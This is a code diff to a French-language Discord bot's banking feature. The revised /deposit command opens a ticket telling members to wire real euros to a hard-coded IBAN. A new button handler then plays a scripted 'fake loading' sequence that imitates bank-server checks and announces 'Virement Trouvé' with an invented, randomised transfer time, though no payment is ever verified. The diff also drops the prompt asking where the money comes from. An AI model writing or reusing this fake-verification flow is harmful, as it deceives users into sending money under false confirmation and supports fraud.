@@ -1,5 +1,6 @@
 const fs = require("fs");
 const cron = require("node-cron");
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 const {
   EmbedBuilder,
   SlashCommandBuilder,
@@ -24,6 +25,10 @@ const RICHEST_TITLE = "💰 Classement — Les plus riches";
 const BTN_REFRESH_RICHEST = "bank_refresh_richest";
 const DEPOSIT_ACCEPT_PREFIX = "bank_deposit_accept_";
 const DEPOSIT_REFUSE_PREFIX = "bank_deposit_refuse_";
+const DEPOSIT_SENT_PREFIX = "bank_deposit_sent_";
+const DEPOSIT_CATEGORY_ID = "1509977402485510345";
+const DEPOSIT_IBAN = "FR6410096988618TN3F7PCVDZ96";
+const DEPOSIT_FONDATION2_ROLE_ID = "1509979964651343993";
 
 function isFondation(member) {
   return member?.roles.cache.has(FONDATION_ROLE_ID) ?? false;
@@ -282,55 +287,155 @@ async function handleBankInteraction(interaction, client) {
     return true;
   }
 
-  // --- Demande de dépôt (validation Fondation) ---
+  // --- Demande de dépôt — crée un ticket avec IBAN ---
   if (interaction.isChatInputCommand() && interaction.commandName === "deposit") {
     const amount = interaction.options.getNumber("montant", true);
-    const motif = interaction.options.getString("motif") || "—";
 
     if (amount <= 0) {
       await interaction.reply({ content: "❌ Le montant doit être positif.", ephemeral: true });
       return true;
     }
 
-    const state = loadState();
     const requestId = `dep_${Date.now()}`;
     const { tax, net } = applyDepositTax(amount);
 
+    const state = loadState();
     state.deposits[requestId] = {
       userId: interaction.user.id,
       amount,
-      motif,
       status: "pending",
       createdAt: Date.now(),
     };
     saveState(state);
 
-    const channel = await client.channels.fetch(TRANSACTION_LOG_CHANNEL_ID).catch(() => null);
-    if (!channel?.isTextBased()) {
-      await interaction.reply({
-        content: "❌ Salon de validation introuvable. Contactez un admin.",
-        ephemeral: true,
-      });
+    // Créer le ticket dans la catégorie dépôt
+    const category = await client.channels.fetch(DEPOSIT_CATEGORY_ID).catch(() => null);
+    const guild = interaction.guild;
+    const ticketChannel = await guild.channels.create({
+      name: `deposit-${interaction.user.username}`,
+      parent: category?.id || null,
+      permissionOverwrites: [
+        { id: guild.roles.everyone, deny: ["ViewChannel"] },
+        { id: interaction.user.id, allow: ["ViewChannel", "SendMessages", "ReadMessageHistory"] },
+        { id: FONDATION_ROLE_ID, allow: ["ViewChannel", "SendMessages", "ReadMessageHistory"] },
+        { id: DEPOSIT_FONDATION2_ROLE_ID, allow: ["ViewChannel", "SendMessages", "ReadMessageHistory"] },
+      ],
+    }).catch(() => null);
+
+    if (!ticketChannel) {
+      await interaction.reply({ content: "❌ Impossible de créer le ticket. Contactez un admin.", ephemeral: true });
       return true;
     }
 
-    const embed = new EmbedBuilder()
-      .setColor(0xf39c12)
-      .setTitle("🏦 Demande de dépôt")
+    const ibanEmbed = new EmbedBuilder()
+      .setColor(0x2980b9)
+      .setTitle("🏦 Dépôt bancaire")
+      .setDescription(
+        `Bonjour <@${interaction.user.id}> !\n\n` +
+        `Vous souhaitez déposer **${formatEuro(amount)}** sur votre compte.\n` +
+        `Après la taxe de ${DEPOSIT_TAX_RATE * 100}%, vous recevrez **${formatEuro(net)}**.\n\n` +
+        `**📋 Instructions :**\n` +
+        `Effectuez un virement du montant exact vers l'IBAN ci-dessous :\n\n` +
+        `\`\`\`\n${DEPOSIT_IBAN}\n\`\`\`\n` +
+        `> ⚠️ Mentionnez votre pseudo Discord en référence du virement.\n\n` +
+        `Une fois le virement effectué, cliquez sur le bouton **"J'ai envoyé l'argent"**.`
+      )
       .addFields(
-        { name: "Membre", value: `${interaction.user}`, inline: true },
-        { name: "Montant demandé", value: formatEuro(amount), inline: true },
-        { name: `Taxe (${DEPOSIT_TAX_RATE * 100}%)`, value: formatEuro(tax), inline: true },
-        { name: "Il recevra", value: `**${formatEuro(net)}**`, inline: true },
-        { name: "Motif", value: motif }
+        { name: "Montant à envoyer", value: `**${formatEuro(amount)}**`, inline: true },
+        { name: "Vous recevrez", value: `**${formatEuro(net)}**`, inline: true },
+        { name: "Taxe (5%)", value: formatEuro(tax), inline: true },
       )
       .setFooter({ text: `Réf. ${requestId}` })
       .setTimestamp();
 
-    const row = new ActionRowBuilder().addComponents(
+    const sentRow = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`${DEPOSIT_SENT_PREFIX}${requestId}`)
+        .setLabel("J'ai envoyé l'argent")
+        .setEmoji("💸")
+        .setStyle(ButtonStyle.Primary)
+    );
+
+    await ticketChannel.send({
+      content: `<@${interaction.user.id}>`,
+      embeds: [ibanEmbed],
+      components: [sentRow],
+    });
+
+    await interaction.reply({
+      content: `✅ Votre ticket de dépôt a été ouvert : ${ticketChannel}`,
+      ephemeral: true,
+    });
+    return true;
+  }
+
+  // --- Bouton "J'ai envoyé l'argent" → faux chargement 30s ---
+  if (interaction.isButton() && interaction.customId.startsWith(DEPOSIT_SENT_PREFIX)) {
+    const requestId = interaction.customId.slice(DEPOSIT_SENT_PREFIX.length);
+    const state = loadState();
+    const request = state.deposits[requestId];
+
+    if (!request || request.status !== "pending") {
+      await interaction.reply({ content: "❌ Cette demande n'est plus en attente.", ephemeral: true });
+      return true;
+    }
+    if (interaction.user.id !== request.userId) {
+      await interaction.reply({ content: "❌ Ce ticket ne vous appartient pas.", ephemeral: true });
+      return true;
+    }
+
+    // Marquer comme "envoyé" pour éviter double-clic
+    request.status = "sent";
+    request.sentAt = Date.now();
+    saveState(state);
+
+    // Désactiver le bouton
+    await interaction.update({
+      components: [new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId(`${DEPOSIT_SENT_PREFIX}${requestId}`)
+          .setLabel("Vérification en cours…")
+          .setEmoji("🔍")
+          .setStyle(ButtonStyle.Secondary)
+          .setDisabled(true)
+      )],
+    });
+
+    // Faux chargement — messages progressifs
+    const loadingMsg = await interaction.channel.send("🔍 Recherche du virement en cours…");
+    await sleep(10000);
+    await loadingMsg.edit("🔍 Connexion aux serveurs bancaires…").catch(() => null);
+    await sleep(10000);
+    await loadingMsg.edit("🔍 Vérification des transactions récentes…").catch(() => null);
+    await sleep(10000);
+
+    // Heure simulée = maintenant - aléatoire entre 1 et 5 min
+    const sentTime = new Date(Date.now() - Math.floor(Math.random() * 4 + 1) * 60 * 1000);
+    const heureStr = sentTime.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit", timeZone: "Europe/Paris" });
+
+    const { tax, net } = applyDepositTax(request.amount);
+
+    const foundEmbed = new EmbedBuilder()
+      .setColor(0x2ecc71)
+      .setTitle("✅ Virement Trouvé")
+      .addFields(
+        { name: "🕐 Heure du virement", value: heureStr, inline: true },
+        { name: "💶 Montant reçu", value: formatEuro(request.amount), inline: true },
+      )
+      .setTimestamp();
+
+    const pendingEmbed = new EmbedBuilder()
+      .setColor(0xf39c12)
+      .setTitle("⏳ Ajout disponible à votre compte en bank")
+      .setDescription(
+        `En attente de validation par <@&${FONDATION_ROLE_ID}> ou <@&${DEPOSIT_FONDATION2_ROLE_ID}>.`
+      )
+      .setFooter({ text: `Réf. ${requestId}` });
+
+    const validateRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder()
         .setCustomId(`${DEPOSIT_ACCEPT_PREFIX}${requestId}`)
-        .setLabel("Valider")
+        .setLabel("Valider le dépôt")
         .setEmoji("✅")
         .setStyle(ButtonStyle.Success),
       new ButtonBuilder()
@@ -340,25 +445,19 @@ async function handleBankInteraction(interaction, client) {
         .setStyle(ButtonStyle.Danger)
     );
 
-    await channel.send({
-      content: `<@&${FONDATION_ROLE_ID}> — Nouvelle demande de dépôt à valider`,
-      embeds: [embed],
-      components: [row],
-    });
-
-    await interaction.reply({
-      content:
-        `⏳ Demande de dépôt de **${formatEuro(amount)}** envoyée à la **Fondation**.\n` +
-        `Si elle est validée, vous recevrez **${formatEuro(net)}** (taxe de ${DEPOSIT_TAX_RATE * 100}% : ${formatEuro(tax)}).`,
-      ephemeral: true,
+    await loadingMsg.delete().catch(() => null);
+    await interaction.channel.send({
+      content: `<@&${FONDATION_ROLE_ID}> <@&${DEPOSIT_FONDATION2_ROLE_ID}>`,
+      embeds: [foundEmbed, pendingEmbed],
+      components: [validateRow],
     });
     return true;
   }
 
   if (interaction.isButton() && interaction.customId.startsWith(DEPOSIT_ACCEPT_PREFIX)) {
-    if (!isFondation(interaction.member)) {
+    if (!isFondation(interaction.member) && !interaction.member?.roles.cache.has(DEPOSIT_FONDATION2_ROLE_ID)) {
       await interaction.reply({
-        content: `❌ Seule la **Fondation** <@&${FONDATION_ROLE_ID}> peut valider un dépôt.`,
+        content: `❌ Seule la **Fondation** peut valider un dépôt.`,
         ephemeral: true,
       });
       return true;
@@ -368,7 +467,7 @@ async function handleBankInteraction(interaction, client) {
     const state = loadState();
     const request = state.deposits[requestId];
 
-    if (!request || request.status !== "pending") {
+    if (!request || (request.status !== "pending" && request.status !== "sent")) {
       await interaction.reply({ content: "❌ Cette demande n'est plus en attente.", ephemeral: true });
       return true;
     }
@@ -397,9 +496,8 @@ async function handleBankInteraction(interaction, client) {
         { name: "Membre", value: `<@${request.userId}>`, inline: true },
         { name: "Validé par", value: `${interaction.user}`, inline: true },
         { name: "Montant", value: formatEuro(gross), inline: true },
-        { name: `Taxe (${DEPOSIT_TAX_RATE * 100}%)`, value: formatEuro(tax), inline: true },
+        { name: `Taxe (5%)`, value: formatEuro(tax), inline: true },
         { name: "Crédité", value: `**${formatEuro(net)}**`, inline: true },
-        { name: "Motif", value: request.motif || "—" }
       )
       .setTimestamp();
 
@@ -411,13 +509,21 @@ async function handleBankInteraction(interaction, client) {
         .send(`✅ Votre dépôt de **${formatEuro(gross)}** a été validé — **${formatEuro(net)}** crédités sur votre compte \`/bank\`.`)
         .catch(() => null);
     }
+
+    // Fermer le ticket après 10s
+    setTimeout(async () => {
+      await interaction.channel?.send("✅ Dépôt validé. Ce ticket sera fermé dans quelques secondes.").catch(() => null);
+      await sleep(5000);
+      await interaction.channel?.delete().catch(() => null);
+    }, 3000);
+
     return true;
   }
 
   if (interaction.isButton() && interaction.customId.startsWith(DEPOSIT_REFUSE_PREFIX)) {
-    if (!isFondation(interaction.member)) {
+    if (!isFondation(interaction.member) && !interaction.member?.roles.cache.has(DEPOSIT_FONDATION2_ROLE_ID)) {
       await interaction.reply({
-        content: `❌ Seule la **Fondation** <@&${FONDATION_ROLE_ID}> peut refuser un dépôt.`,
+        content: `❌ Seule la **Fondation** peut refuser un dépôt.`,
         ephemeral: true,
       });
       return true;
@@ -427,7 +533,7 @@ async function handleBankInteraction(interaction, client) {
     const state = loadState();
     const request = state.deposits[requestId];
 
-    if (!request || request.status !== "pending") {
+    if (!request || (request.status !== "pending" && request.status !== "sent")) {
       await interaction.reply({ content: "❌ Cette demande n'est plus en attente.", ephemeral: true });
       return true;
     }
@@ -456,6 +562,14 @@ async function handleBankInteraction(interaction, client) {
         .send(`❌ Votre demande de dépôt de **${formatEuro(request.amount)}** a été refusée.`)
         .catch(() => null);
     }
+
+    // Fermer le ticket
+    setTimeout(async () => {
+      await interaction.channel?.send("❌ Dépôt refusé. Ce ticket sera fermé dans quelques secondes.").catch(() => null);
+      await sleep(5000);
+      await interaction.channel?.delete().catch(() => null);
+    }, 3000);
+
     return true;
   }
 
@@ -669,20 +783,13 @@ function registerDelMoneyCommand() {
 function registerDepositCommand() {
   return new SlashCommandBuilder()
     .setName("deposit")
-    .setDescription(`Demander un dépôt sur votre compte (${DEPOSIT_TAX_RATE * 100}% de taxe, validé par la Fondation)`)
+    .setDescription("Déposer de l'argent sur votre compte via virement bancaire")
     .addNumberOption((option) =>
       option
         .setName("montant")
         .setDescription("Montant à déposer (€)")
         .setRequired(true)
-        .setMinValue(0.01)
-    )
-    .addStringOption((option) =>
-      option
-        .setName("motif")
-        .setDescription("D'où vient cet argent ?")
-        .setRequired(false)
-        .setMaxLength(200)
+        .setMinValue(1)
     )
     .toJSON();
 }
